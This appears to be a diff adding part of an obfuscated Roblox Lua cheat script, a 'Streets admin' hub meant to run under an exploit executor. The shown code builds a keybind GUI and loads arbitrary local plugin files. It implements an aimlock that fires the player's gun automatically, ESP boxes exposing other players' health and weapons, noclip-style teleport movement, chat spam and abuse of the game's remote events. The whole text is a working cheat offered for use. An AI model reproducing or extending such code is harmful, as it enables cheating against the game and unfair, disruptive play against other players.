+	L_111_.AnchorPoint = Vector2.new(0.5, 0.5)
+	L_111_.Size = UDim2.new(0, 218, 0, 154)
+	L_111_.Visible = false 
+
+	L_112_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_112_.BackgroundTransparency = 0.7
+	L_112_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_112_.Position = UDim2.new(0.17, 0, 0.43, 0)
+	L_112_.Size = UDim2.new(0, 49, 0, 49)
+	L_112_.Font = Enum.Font.SourceSans
+	L_112_.TextColor3 = Color3.fromRGB(255, 255, 255)
+	L_112_.TextSize = 13
+	L_112_.TextWrapped = true
+	L_112_.Text = "Type a command then click"
+	
+	L_113_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_113_.BackgroundTransparency = 0.3
+	L_113_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_113_.Position = UDim2.new(0.004, 0, - 0.3, 0)
+	L_113_.Size = UDim2.new(0, 217, 0, 50)
+	L_113_.Font = Enum.Font.SciFi
+	L_113_.Text = "Keys GUI"
+	L_113_.TextColor3 = Color3.fromRGB(214, 0, 0)
+	L_113_.TextSize = 50
+	
+	L_114_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_114_.BackgroundTransparency = 0.6
+	L_114_.BorderColor3 = Color3.fromRGB(0, 0, 127)
+	L_114_.Position = UDim2.new(0.6, 0, 0.07, 0)
+	L_114_.Size = UDim2.new(0, 50, 0, 44)
+	L_114_.Font = Enum.Font.Fantasy
+	L_114_.Text = "CmdBar Key"
+	L_114_.TextColor3 = Color3.fromRGB(255, 255, 255)
+	L_114_.TextSize = 11
+	L_114_.TextWrapped = true
+	
+	L_115_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_115_.BackgroundTransparency = 0.7
+	L_115_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_115_.Position = UDim2.new(0.6, 0, 0.43, 0)
+	L_115_.Size = UDim2.new(0, 49, 0, 49)
+	L_115_.Font = Enum.Font.SourceSans
+	L_115_.Text = "Click then press a key"
+	L_115_.TextColor3 = Color3.fromRGB(255, 255, 255)
+	L_115_.TextSize = 13
+	L_115_.TextWrapped = true
+	
+	L_116_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_116_.BackgroundTransparency = 0.6
+	L_116_.BorderColor3 = Color3.fromRGB(0, 0, 127)
+	L_116_.Position = UDim2.new(0.17, 0, 0.07, 0)
+	L_116_.Size = UDim2.new(0, 50, 0, 44)
+	L_116_.Font = Enum.Font.Fantasy
+	L_116_.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+	L_116_.PlaceholderText = "CmdToSet"
+	L_116_.Text = ""
+	L_116_.TextColor3 = Color3.fromRGB(255, 255, 255)
+	L_116_.TextSize = 11
+	L_116_.TextWrapped = true
+	L_156_func(L_111_, L_111_)
+end)) -- 
+
+coroutine.resume(coroutine.create(function()
+	local L_635_, L_636_, L_637_ = syn_io_listdir or list_files, syn_io_isfolder or isfolder, syn_io_makefolder or makefolder
+	if L_635_ and L_636_ and L_637_ then 
+		if not L_636_'CyAdminPlugins' then 
+			L_637_('CyAdminPlugins')
+		end 
+		for L_638_forvar0, L_639_forvar1 in pairs(L_635_'CyAdminPlugins') do 
+			local L_640_ = loadfile(L_639_forvar1)
+			if not L_640_ then
+				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("There was a syntax error (sadly can\'t output it as loadfile is gay)", "All")
+			else 
+				local L_641_, L_642_ = pcall(L_640_) 
+				if not L_641_ then 
+					ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error" .. L_642_, "All")
+				end
+			end
+		end
+	end 
+	if not getfenv()['getgenv']()['loaded'] then
+		while true do
+		end
+	end
+	L_98_.Text = "Commands | Total Commands: " .. # L_119_
+	for L_643_forvar0 = 1, # L_119_ do 
+		local L_644_ = L_119_[L_643_forvar0]
+		local L_645_, L_646_, L_647_, L_648_ = L_644_.Name, L_644_.Args, L_644_.Alias, L_644_.Help
+		L_159_func(UDim2.new(0.0008, 0, 0.002, -35 + (L_643_forvar0 * 29)), L_645_, L_648_)
+		coroutine.resume(coroutine.create(function()
+			L_158_func(L_645_, L_646_)
+		end))
+		coroutine.resume(coroutine.create(function()
+			for L_649_forvar0 = 1, # L_647_ do
+				L_158_func("[Alias] " .. L_647_[L_649_forvar0], L_646_)
+			end
+		end))
+	end
+	while wait() do
+		local L_650_ = GetChar()
+		coroutine.resume(coroutine.create(function()
+			if L_650_ and L_650_:FindFirstChildOfClass'Humanoid' then 
+				if workspace.Gravity < L_68_ then 
+					if game.PlaceId == 455366377 and not L_650_:FindFirstChild'RealHumanoidRootPart' then 
+						L_650_.Humanoid:ChangeState(3)
+						L_650_.Humanoid.PlatformStand = false
+						wait(0.2)
+					end
+					L_650_.Humanoid:ChangeState(8)
+				end
+				if game.PlaceId == 455366377 then 
+					if L_650_.Humanoid.HipHeight > 0 or L_14_ and not L_29_ then 
+						L_650_.Humanoid:ChangeState(3)
+						L_650_.Humanoid.PlatformStand = false
+						RunService.RenderStepped:Wait()
+						L_650_.Humanoid:ChangeState(8)
+						wait(2)
+					end
+				end
+			end
+			local L_652_ = tick()
+			ReplicatedStorage.DefaultChatSystemChatEvents.MutePlayerRequest:InvokeServer()
+			L_83_ = (tick() - L_652_)
+		end))
+		local L_651_ = L_650_:FindFirstChildOfClass'Tool'
+		if L_6_ and L_71_ and L_651_ and L_651_:FindFirstChild('Clips', true) and L_71_:FindFirstChildOfClass'Humanoid' and L_71_.Humanoid.Health > 0 and not L_71_:FindFirstChildOfClass'ForceField' then
+			if not L_166_func(L_71_) and L_146_func(L_2_:GetPlayerFromCharacter(L_71_), "Bone") ~= "Yes" then
+				if L_71_:FindFirstChild'Head' and L_650_:FindFirstChild'Head' and (L_71_.Head.Position - L_650_.Head.Position).magnitude <= L_135_[L_651_.Name] then 
+					if game.PlaceId == 455366377 then
+						LP.Backpack.Input:FireServer("ml", {
+							['mousehit'] = L_168_func();
+							['shift'] = UserInput:IsKeyDown(Enum.KeyCode.LeftShift);
+							['velo'] = L_650_.Head.Velocity.magnitude;
+						})
+					else 
+						L_651_.Fire:FireServer(L_168_func())
+					end
+				end 
+			end 
+		end
+		if L_650_:FindFirstChildOfClass'Humanoid' then 
+			if L_651_ and L_651_:FindFirstChild'Ammo' then 
+				L_108_.Text = "Health: " .. math.floor(L_650_.Humanoid.Health) .. "\nCurrent WalkSpeed: " .. math.floor(L_650_.Humanoid.WalkSpeed) .. "\nSprinting Speed: " .. L_64_ .. "\nCrouching Speed: " .. L_60_ .. "\nBlink Speed: " .. L_54_ .. "\nJumpPower: " .. L_650_.Humanoid.JumpPower .. "\nNoclipping: " .. tostring(L_40_) .. "\nAimlocking: " .. tostring(L_9_) .. "\nAimlock Target: " .. tostring(L_71_) .. "\n" .. L_651_.Name .. " Ammo&Clips: " .. L_651_.Ammo.Value .. "/" .. L_651_.Clips.Value
+			else 
+				L_108_.Text = "Health: " .. math.floor(L_650_.Humanoid.Health) .. "\nCurrent WalkSpeed: " .. math.floor(L_650_.Humanoid.WalkSpeed) .. "\nSprinting Speed: " .. L_64_ .. "\nCrouching Speed: " .. L_60_ .. "\nBlink Speed: " .. L_54_ .. "\nJumpPower: " .. L_650_.Humanoid.JumpPower .. "\nNoclipping: " .. tostring(L_40_) .. "\nAimlocking: " .. tostring(L_9_) .. "\nAimlock Target: " .. tostring(L_71_) 
+			end
+		end 
+		if L_71_ and L_71_:FindFirstChild'Torso' then
+			if L_72_ then 
+				local L_653_ = (L_72_ - L_71_.Torso.Position).magnitude / L_57_
+				if L_653_ > 1 then
+					L_58_ = L_653_
+				else
+					L_58_ = 5
+				end
+				L_72_ = L_71_.Torso.Position
+			else
+				L_72_ = L_71_.Torso.Position
+			end				
+		end
+		if L_78_ then 
+			L_78_.Position = L_80_.Handle.Position + CFrame.new(L_80_.Handle.Position, Mouse.Hit.p).lookVector * L_59_
+		end
+		if L_104_.Visible then 
+			L_105_.TextColor3 = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
+		end
+		if LP.Character then 
+			local L_654_ = L_650_:FindFirstChild'RealHumanoidRootPart' or L_650_:FindFirstChild'Torso'
+			if L_654_ and L_20_ and L_136_['Shift'] then 
+				if L_136_['W'] then 
+					L_654_.CFrame = L_654_.CFrame * CFrame.new(0, 0, - L_54_)
+				end 
+				if L_136_['A'] then 
+					L_654_.CFrame = L_654_.CFrame * CFrame.new(- L_54_, 0, 0)
+				end
+				if L_136_['S'] then 
+					L_654_.CFrame = L_654_.CFrame * CFrame.new(0, 0, L_54_)
+				end
+				if L_136_['D'] then 
+					L_654_.CFrame = L_654_.CFrame * CFrame.new(L_54_, 0, 0)
+				end
+			end
+		end
+		for L_655_forvar0 = 1, # L_122_ do
+			local L_656_ = L_122_[L_655_forvar0]
+			local L_657_ = L_656_['Player']
+			if L_657_ and L_657_.Character then
+				local L_658_, L_659_ = L_657_.Character:FindFirstChild'Head', L_657_.Character:FindFirstChild'RealHumanoidRootPart' or L_657_.Character:FindFirstChild'Torso'
+				if L_658_ and L_659_ and L_650_:FindFirstChild'Head' then
+					local L_660_, L_661_ = L_152_func(L_658_.Position)
+					local L_662_ = Vector3.new(2, 3, 0) * ((L_658_.Size.Y / 2) * 2)
+					local L_663_ = L_152_func((L_659_.CFrame * CFrame.new(L_662_.X, L_662_.Y, 0)).p)
+					local L_664_ = L_152_func((L_659_.CFrame * CFrame.new(- L_662_.X, L_662_.Y, 0)).p)
+					local L_665_ = L_152_func((L_659_.CFrame * CFrame.new(L_662_.X, - L_662_.Y, 0)).p)
+					local L_666_ = L_152_func((L_659_.CFrame * CFrame.new(- L_662_.X, - L_662_.Y, 0)).p)
+					L_151_func(L_656_, L_661_, L_657_)
+					local L_667_ = L_118_[L_657_] and "Yes" or "No"
+					L_656_['Text'].Text = L_657_.Name .. " | Health: " .. L_145_func(L_657_.Character) .. " | KO'ed: " .. L_146_func(L_657_, "Bone") .. " | Pos: " .. math.floor((L_650_.Head.Position - L_658_.Position).magnitude) .. "\nHas Glock: " .. L_146_func(L_657_, "Glock") .. " | Shotty: " .. L_146_func(L_657_, "Shotty") .. " | Vest: " .. L_146_func(L_657_, "BulletResist") .. "\nCyAdmin User: " .. L_667_
+					L_656_['Text'].Position = Vector2.new(L_660_.X, L_660_.Y) + Vector2.new(0, 10)
+					L_656_['Box'][1].From = Vector2.new(L_663_.X, L_663_.Y)
+					L_656_['Box'][1].To = Vector2.new(L_664_.X, L_664_.Y)
+					L_656_['Box'][2].From = Vector2.new(L_664_.X, L_664_.Y)
+					L_656_['Box'][2].To = Vector2.new(L_666_.X, L_666_.Y)
+					L_656_['Box'][3].From = Vector2.new(L_665_.X, L_665_.Y)
+					L_656_['Box'][3].To = Vector2.new(L_663_.X, L_663_.Y)
+				end
+			end
+		end 
+	end
+end))
+
+coroutine.resume(coroutine.create(function()
+	while wait(1) do
+		if CmdBarKey == "Quote" then 
+			L_110_.Text = "Open Command Bar: \'\nGunStomp: E"
+		else
+			L_110_.Text = "Open Command Bar: " .. CmdBarKey .. "\nGunStomp: E"
+		end
+		for L_668_forvar0, L_669_forvar1 in pairs(L_124_) do
+			L_110_.Text = L_110_.Text .. "\n" .. L_669_forvar1:match'^[%w%s]+' .. ": " .. L_669_forvar1:match'[%a%d]+$'
+		end 
+		if L_27_ then 
+			local L_670_ = L_2_:GetPlayers()
+			for L_671_forvar0 = 1, # L_670_ do 
+				local L_672_ = L_670_[L_671_forvar0]
+				if L_672_ ~= LP and L_672_.Character and L_672_.Character:FindFirstChild'Head' then 
+					if L_672_.Character:FindFirstChild'Humanoid' and L_672_.Character:findFirstChild'Right Arm' then 
+						if L_121_[L_672_.Name] then
+							local L_673_ = L_672_.Character.Head.Velocity
+							local L_674_ = L_121_[L_672_.Name]
+							if not L_672_.Character.Head:FindFirstChildOfClass'BillboardGui' and L_672_.Character.Humanoid.Health > 0 and not L_672_.Character:FindFirstChild('Bone', true) and not L_672_.Character:FindFirstChildOfClass'ForceField' then 
+								if (Vector3.new(L_673_.X, 0, 0) - Vector3.new(L_674_.X, 0, 0)).magnitude >= 85 or (Vector3.new(0, 0, L_673_.Z) - Vector3.new(0, 0, L_674_.Z)).magnitude >= 85 then
+									L_148_func(L_672_.Character.Head, "Exploiter: " .. L_672_.Name .. " Reason: moved too fast", Color3.fromRGB(255, 255, 255))
+									L_121_[L_672_.Name] = L_672_.Character.Head.Velocity
+								else
+									L_121_[L_672_.Name] = L_672_.Character.Head.Velocity
+								end
+							end
+						else
+							L_121_[L_672_.Name] = L_672_.Character.Head.Velocity
+						end
+					else
+						if not L_672_.Character.Head:FindFirstChildOfClass'BillboardGui' and L_672_.Character:FindFirstChildOfClass'Tool' then
+							L_148_func(L_672_.character.Head, "Exploiter: " .. L_672_.Name .. " Reason: Feloop/Anti Feloop", Color3.fromRGB(255, 255, 255))
+						end 
+					end
+				end
+			end
+		end
+		if # L_128_ > 0 then 
+			for L_675_forvar0, L_676_forvar1 in pairs(L_128_) do 
+				local L_677_, L_678_ = workspace.CurrentCamera:WorldToViewportPoint(L_676_forvar1[2].Position)
+				L_676_forvar1[1].Visible = L_678_
+			end 
+		end 
+	end
+end))
+
+coroutine.resume(coroutine.create(function()
+	for L_679_forvar0, L_680_forvar1 in pairs(L_2_:GetPlayers()) do
+		local L_681_ = L_130_[L_680_forvar1.UserId]
+		local L_682_ = L_131_[L_680_forvar1.UserId]
+		if (L_682_ or L_680_forvar1:IsInGroup(5152759) or string.find(L_680_forvar1.Name:lower(), "lynx")) and L_680_forvar1.character and L_680_forvar1.Character:FindFirstChild'Head' then
+			L_148_func(L_680_forvar1.Character.Head, L_680_forvar1.Name, Color3.fromRGB(102, 51, 0), true)
+			L_680_forvar1.CharacterAdded:Connect(function(L_684_arg0)
+				local L_685_ = L_684_arg0:WaitForChild'Head'
+				if L_685_ then 
+					L_148_func(L_685_, L_680_forvar1.Name, Color3.fromRGB(102, 51, 0), true)
+				end 
+			end)
+		end 
+		if L_681_ and L_680_forvar1.Character and L_680_forvar1.Character:FindFirstChild'Head' then
+			L_680_forvar1.Chatted:Connect(function(L_686_arg0)
+				L_138_func(L_680_forvar1, L_686_arg0)
+			end)
+			L_148_func(L_680_forvar1.Character.Head, L_681_['Name'], L_681_['Colour'])
+			L_141_func(L_680_forvar1, L_681_['Colour'])
+			L_680_forvar1.CharacterAdded:Connect(function(L_687_arg0)
+				local L_688_ = L_687_arg0:WaitForChild'Head'
+				if L_688_ then
+					L_141_func(L_680_forvar1, L_681_['Colour'])
+					L_148_func(L_688_, L_681_['Name'], L_681_['Colour'])
+				end
+			end)
+		end
+		local L_683_;
+		L_683_ = L_680_forvar1.Chatted:Connect(function(L_689_arg0)
+			local L_690_ = L_150_func(L_680_forvar1, L_689_arg0)
+			if L_690_ then 
+				L_683_:Disconnect()
+			end
+		end)
+	end
+	coroutine.resume(coroutine.create(function()
+		while wait(L_56_) do 
+			if L_41_ then 
+				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(L_50_, "All")
+			end 
+		end
+	end))
+	while wait(L_53_) do 
+		if RainbowHats and LP.Backpack:FindFirstChild'Stank' then
+			if RainbowHats == "All" then 
+				local L_692_ = LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()
+				LP.Backpack.Stank:FireServer("rep", L_692_[math.random(1, # L_692_)])
+			end 
+			local L_691_ = LP.PlayerGui.HUD.Clan.Group.cs:GetChildren()
+			LP.Backpack.Stank:FireServer("color", L_691_[math.random(1, # L_691_)])
+		end
+	end
+end))
+
+-- [[ End ]] --
+
+notif("d11voqii's hub Streets admin", "took " .. string.format("%.6f", tick() - L_1_) .. " seconds", 10, "rbxassetid://2474242690")
+notif("Newest Update", "THIS WILL NOT BE UPDATED", 10, nil)
